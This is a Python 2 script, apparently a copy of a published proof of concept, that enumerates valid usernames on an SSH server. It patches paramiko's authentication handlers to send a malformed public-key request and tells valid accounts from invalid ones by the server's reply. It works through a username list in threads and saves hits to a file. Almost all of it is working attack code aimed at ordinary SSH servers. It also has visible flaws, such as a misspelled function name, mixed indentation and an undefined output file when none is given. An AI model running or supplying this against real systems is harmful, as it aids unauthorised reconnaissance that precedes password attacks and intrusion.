#!/usr/bin/env python


# Copyright (c) 2018 Matthew Daley & Patrick Sukop
# original script: https://bugfuzz.com/stuff/ssh-check-username.py
#
# Permission is hereby granted, free of charge, to any person obtaining a copy
# of this software and associated documentation files (the "Software"), to
# deal in the Software without restriction, including without limitation the
# rights to use, copy, modify, merge, publish, distribute, sublicense, and/or
# sell copies of the Software, and to permit persons to whom the Software is
# furnished to do so, subject to the following conditions:
#
# The above copyright notice and this permission notice shall be included in
# all copies or substantial portions of the Software.
#
# THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
# IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
# FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
# AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
# LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING
# FROM, OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS
# IN THE SOFTWARE.

import sys, os, string, threading
import argparse
import logging
import paramiko
import socket
import sys
import os


class InvalidUsername(Exception):
    pass


def add_boolean(*args, **kwargs):
    pass

old_service_accept = paramiko.auth_handler.AuthHandler._handler_table[
        paramiko.common.MSG_SERVICE_ACCEPT]

def service_accept(*args, **kwargs):
    paramiko.message.Message.add_boolean = add_boolean
    return old_service_accept(*args, **kwargs)

def userauth_failure(*args, **kwargs):
    raise InvalidUsername()

def ssh_conenction(hostname, port,username, file):
	sock = socket.socket()

	try:
	    sock.connect((hostname, port))
	except socket.error:
		print '[-] Failed to connect'
	    	sys.exit(1)
	transport = paramiko.transport.Transport(sock)
	try:		
	    	transport.start_client()
	except paramiko.ssh_exception.SSHException:
	    	print '[-] Failed to negotiate SSH transport'
	    	sys.exit(2)	
	try:
	    	transport.auth_publickey(username, paramiko.RSAKey.generate(2048))
	except InvalidUsername:
		print '[*] Invalid username: '+ username 		
	except paramiko.ssh_exception.AuthenticationException:
	    	print '[+] Valid username: ' + username	
		try:	
			if file != None:			
				file.write(username + '\n') 
		except TypeError:			
			pass

paramiko.auth_handler.AuthHandler._handler_table.update({
    paramiko.common.MSG_SERVICE_ACCEPT: service_accept,
    paramiko.common.MSG_USERAUTH_FAILURE: userauth_failure
})

logging.getLogger('paramiko.transport').addHandler(logging.NullHandler())

arg_parser = argparse.ArgumentParser()
arg_parser.add_argument('hostname', type=str)
arg_parser.add_argument('--port', type=int, default=22)
arg_parser.add_argument('-u','--username', type=str,  help="input a single username",default='root')
arg_parser.add_argument('-U','--userlist', type=str, help="input a username file",)
arg_parser.add_argument('-o','--output', type=str, help="output file",)
args = arg_parser.parse_args()

if args.output != None:
	file = open(args.output,'w')
if args.userlist != None:
	try:
		filepath = args.userlist
   		if not os.path.isfile(filepath):
       			print(" [-] File path {} does not exist. Exiting...".format(filepath))
       			sys.exit()

		with open(filepath) as fp: 			
			try:        			
				threads = []
				for h in fp:
					t = threading.Thread(target=ssh_conenction, args=(args.hostname, args.port,h.strip(), file))
					t.start()
					threads.append(t)
				for t in threads:
					t.join()	
				
			finally:					
				line = fp.readline()
	finally:  
		fp.close()
		print '[+] Done'
		
else:
	try:
		ssh_conenction(args.hostname, args.port, args.username, file)	
	finally:
		print '[+] DONE '		

if args.output != None:
	file.close() 
sys.exit(1)
